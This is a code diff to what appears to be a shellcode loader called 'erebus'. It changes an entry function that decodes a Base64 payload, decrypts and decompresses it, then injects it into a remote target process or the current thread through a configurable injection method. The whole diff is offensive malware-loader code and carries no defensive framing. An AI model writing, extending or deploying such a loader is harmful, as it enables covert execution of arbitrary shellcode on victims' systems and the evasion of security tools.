@@ -18,6 +18,7 @@ VOID entry(void) {
     HANDLE process_handle = NULL;
     HANDLE thread_handle = NULL;
 
+    // 1. ALLOCATE INITIAL BUFFER (Contains Base64)
     BYTE* pPayload = (BYTE*)HeapAlloc(GetProcessHeap(), 0, sizeof(shellcode));
     if (!pPayload) return; 
 
@@ -30,10 +31,18 @@ VOID entry(void) {
     }
 
     // ============================================================
-    // 1. DEOBFUSCATE
+    // 2. DEOBFUSCATE (DYNAMIC)
     // ============================================================
     
-    erebus::AutoDetectAndDecodeString((CHAR*)pPayload, shellcode_size, &pPayload, &shellcode_size);
+    BYTE* pDecodedBuffer = nullptr;
+    SIZE_T DecodedSize = 0;
+
+    if (erebus::AutoDetectAndDecodeString((CHAR*)pPayload, shellcode_size, &pDecodedBuffer, &DecodedSize)) {
+        // SWAP: Free Base64 buffer -> Switch to Binary buffer
+        HeapFree(GetProcessHeap(), 0, pPayload);
+        pPayload = pDecodedBuffer;
+        shellcode_size = DecodedSize;
+    }
 
     if (erebus::config.decryption_method != nullptr) {
         erebus::config.decryption_method(pPayload, shellcode_size, key, sizeof(key));
@@ -42,8 +51,9 @@ VOID entry(void) {
     erebus::DecompressShellcode(&pPayload, &shellcode_size);
 
     // ============================================================
-    // 2. TARGET PROCESS SETUP
+    // 5. INJECT
     // ============================================================
+    
 #if CONFIG_INJECTION_MODE == 1
     // Remote Injection
     wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
@@ -57,9 +67,6 @@ VOID entry(void) {
     thread_handle = NtCurrentThread();
 #endif
 
-    // ============================================================
-    // 3. INJECT
-    // ============================================================
     if (erebus::config.injection_method != nullptr) {
         erebus::config.injection_method(pPayload, shellcode_size, process_handle, thread_handle);
     }
